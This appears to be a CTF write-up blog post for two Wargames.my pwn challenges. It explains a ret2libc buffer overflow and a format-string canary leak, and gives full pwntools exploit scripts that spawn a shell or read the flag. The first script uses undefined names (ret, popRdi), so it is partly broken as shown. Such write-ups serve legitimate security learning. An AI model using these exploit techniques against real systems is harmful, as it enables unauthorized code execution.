---
toc: true
title: "WGMY CTF (Top #15)"
description: Wargames.my
date: 2023-12-16
author: Duc Anh Nguyen
---

## [1. Pwn: Magic Door](https://github.com/heckintosh/CTF/tree/main/WargamesMy/Pwn/magic-door/challenge)
```shell
pwndbg> checksec
[*] '/home/kali/CTF/WargamesMy/Pwn/magic-door/challenge/magic_door'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
<details open>
  <summary><b>Source</b></summary>

  ```c
  char *open_the_door()
{
  char s1[12]; // [rsp+0h] [rbp-10h] BYREF
  int v2; // [rsp+Ch] [rbp-4h]

  initialize();
  puts("Welcome to the Magic Door !");
  printf("Which door would you like to open? ");
  __isoc99_scanf("%11s", s1); // Enter 050015 here
  getchar();
  if ( !strcmp(s1, "50015") )
    return (char *)no_door_foryou();
  v2 = atoi(s1);
  if ( v2 != 50015 )
    return (char *)no_door_foryou();
  else
    return magic_door();
}
```

```c
char *magic_door()
{
  char s[8]; // [rsp+10h] [rbp-40h] BYREF
  __int64 v2; // [rsp+18h] [rbp-38h]
  __int64 v3; // [rsp+20h] [rbp-30h]
  __int64 v4; // [rsp+28h] [rbp-28h]
  __int64 v5; // [rsp+30h] [rbp-20h]
  __int64 v6; // [rsp+38h] [rbp-18h]
  __int64 v7; // [rsp+40h] [rbp-10h]
  __int64 v8; // [rsp+48h] [rbp-8h]

  *(_QWORD *)s = 0LL;
  v2 = 0LL;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  puts("Congratulations! You opened the magic door!");
  puts("Where would you like to go? ");
  return fgets(s, 256, stdin);
}
  ```
</details>

Easy to see that there is a buffer overflow in magic_door. In order to get to it you have to pass the `open_the_door` function first. The task is to pass these two seemmingly contradicting conditions:

| Conditions      | Description |
| ----------- | ----------- |
|`!strcmp(s1, "50015")` |    strcmp returns 0 if equal -> if "50015" is entered: !0 -> true and you are not able to proceed|
|`v2 = atoi(s1); v2 != 50015`|  Check if atoi(input) == 50015|

Enter 050015 should satisfy first condition and atoi will ignore leading zero also. Now it's just ret2libc for the `magic_door` function (since NX is enabled so no shellcode). Now is just to leak the libc address via puts and perform ret2libc.

<details>
<summary><b>solve.py</b></summary>

```python
from pwn import *
import os
from LibcSearcher import *

context.arch = 'amd64'
pty = process.PTY
is_local = False
is_remote = False

elf = ELF("/home/kali/CTF/WargamesMy/Pwn/magic-door/challenge/magic_door")
if len(sys.argv) == 1:
    is_local = True
    p = process(elf.path, stdin=pty, stdout=pty)

elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)


#debug(cmd='''b *magic_door+135''')
print(p.recvuntilS("open?"))

p.sendline("050015")
print(p.recvuntilS("go?"))

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

log.info("pop rdi: " + hex(pop_rdi))
log.info("Puts@plt: " + hex(puts_plt))
log.info("Puts got: " + hex(puts_got))
log.info("Main: " + hex(main))

payload = b'A' * 72 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) # leak put address and return to main to execute system command after knowing libc
p.sendline(payload)

p.recv()
puts_leak = u64(p.recv(6).ljust(8,b"\x00")) 

log.info("Puts leak " + hex(puts_leak))
libc = LibcSearcher("puts", puts_leak) # using libc searcher right here, if there is libc error you have to manually addd libc to libcsearcherfolder.

p.sendlineafter(b"Which door would you like to open?",b"050015")

rop  = b"A"* 72
rop += ret + popRdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])

p.sendlineafter(b"Where would you like to go?",rop)
p.interactive()

#print(p.recvall(timeout=1))

```
</details>


## [2. Pwn: Pakmat Burger](https://github.com/heckintosh/CTF/tree/main/WargamesMy/Pwn/pakmatburger/challenge)

<details open>
<summary><b>Source</b></summary>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char *s2; // [rsp+0h] [rbp-40h]
  char s1[9]; // [rsp+Ah] [rbp-36h] BYREF
  char phonenum[10]; // [rsp+13h] [rbp-2Dh] BYREF
  char format[12]; // [rsp+1Dh] [rbp-23h] BYREF
  char v8[15]; // [rsp+29h] [rbp-17h] BYREF
  unsigned __int64 v9; // [rsp+38h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  initialize(argc, argv, envp);
  s2 = getenv("SECRET_MESSAGE");
  if ( s2 )
  {
    puts("Welcome to Pak Mat Burger!");
    printf("Please enter your name: ");
    __isoc99_scanf("%11s", format);
    printf("Hi ");
    printf(format);
    printf(", to order a burger, enter the secret message: ");
    __isoc99_scanf("%8s", s1);
    if ( !strcmp(s1, s2) )
    {
      puts("Great! What type of burger would you like to order? ");
      __isoc99_scanf("%14s", v8);
      getchar();
      printf("Please provide your phone number, we will delivered soon: ");
      return (unsigned int)fgets(phonenum, 100, stdin);
    }
    else
    {
      puts("Sorry, the secret message is incorrect. Exiting...");
      return 0;
    }
  }
  else
  {
    puts("Error: SECRET_MESSAGE environment variable not set. Exiting...");
    return 1;
  }
}
```

```c
int secret_order()
{
  return system("cat ./flag.txt");
}
```
</details>

Examining the source code, there is a format string vulnerability in `printf(format)`. Using this we can leak the secret and bypass the secret requirements. Also we can use it to bypass the canary. `return (unsigned int)fgets(phonenum, 100, stdin);` is just straight up a buffer overflow vulnerability. Phonenum length is only 10 but `fgets` allows 100 characters to be put in the array. Overflow and return to the `secret_order` function to get the flag. 

Since the secret does not change and I can only use the format vulnerablity to leak two out of three key information for this challenge, I have to connect to the server twice, first call is to leak the secret and the second time is for full exploitation.

<details open>
<summary><b>solve.py</b></summary>

```python
from pwn import *
import os
import re

context.arch = 'amd64'
pty = process.PTY
is_local = False
is_remote = False

elf = ELF("/home/kali/CTF/WargamesMy/Pwn/pakmatburger/challenge/pakmat_burger")
if len(sys.argv) == 1:
    is_local = True
    p = process(elf.path, stdin=pty, stdout=pty)

elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)



# Grab secret the first time
print(p.recvuntilS("name:"))
p.sendline(b"%6$s")
secret = p.recvuntil(",")[:-1].decode().split()[1]
log.info("Secret " + secret)
p.close()

# Run again:
# p = process(elf.path, stdin=pty, stdout=pty)
p = remote(host,port)
# debug(cmd='''
# b *main+373
# ''')

print(p.recvuntilS("name:"))
p.sendline(b"%13$p.%17$p") # 13 is canary, 17 is main
leak = p.recvuntil(",")[:-1].decode().split()[1].split(".")
canary = leak[0]
main_leak = leak[1]
pop_rdi = 0x000000000000101a

log.info("Canary " + canary)
log.info("Main " + main_leak)
canary = int(canary, 16)
main_leak = int(main_leak, 16)
ret_offset = main_leak + 394  # calculate these by deducing them in gdb 
secret_offset = main_leak - 22
log.info("Ret " + f"0x{ret_offset:016x}")
log.info("Secret Order " + f"0x{secret_offset:016x}") # Calculate secret order address
p.sendline(secret)

print(p.recvuntilS("order?"))
p.sendline(b"Test")
print(p.recvuntilS("soon:"))

payload = b"A"*37 + p64(canary) + b"A"*8 + p64(ret_offset) + p64(secret_offset)  # Overflow the buffer and return to the secret function.

p.sendline(payload)
p.recvall(timeout = 1)
# """ 
# Code For finding offset from canary til ret. it was 8 
# p.wait()
# core = p.corefile
# stack = core.rsp
# log.info("rsp = %#x", stack)
# pattern = core.read(stack, 4)
# rip_offset = cyclic_find(pattern)
# log.info("rip offset is %d", rip_offset)
# """

p.interactive()
```
</details>